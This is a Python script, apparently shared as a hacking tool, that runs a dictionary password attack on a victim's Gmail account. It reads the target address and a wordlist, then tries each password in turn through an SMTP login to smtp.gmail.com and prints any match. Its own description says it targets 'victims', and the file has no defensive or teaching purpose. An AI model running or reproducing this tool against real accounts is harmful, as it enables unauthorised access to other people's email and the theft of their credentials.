"""
PROJECT: ********** PYTHON BRUTEFORCE SCRIPT HACK ************************

DEVELOPER: ************** CHUKWUEMEKA WISDOM a.k.a Ubuntu *****************************

DESCRIPTION: With this script, it is super easy to perform bruteforce password dictionary attacks on
                victims gmail account.
"""

# import SMTP library
import smtplib
from pyfiglet import *


# display title ASCII art
text = "PYTHON BRUTEFORCE SCRIPT"
desc = "Developed by Chukwuemeka Wisdom a.k.a UBUNTU"

display_text = figlet_format(text)
display_desc = figlet_format(desc, font="digital")
print(display_text)
print(display_desc)

# ********* exception *********

try:

    # _init smtp
    smtp_server = smtplib.SMTP_SSL("smtp.gmail.com", 465)


    # start encryption
    #smtp_server.starttls()

    # establish connection
    smtp_server.ehlo()
    
    

except smtplib.SMTPConnectError:
    print("Connection Error")


# Accept user input
username = raw_input("Enter Victims email address:")
password_file = raw_input("Enter password wordlist: ")

# open the pass_file
pass_file = open(password_file, "r")

# loop through the pass_file
for password in pass_file:
    # we login
    try:
        smtp_server.login(username, password)
        print("[+] Password Found: {}".format(password))
        break

    except smtplib.SMTPAuthenticationError:
        print("[-] Password Incorrect {}".format(password))



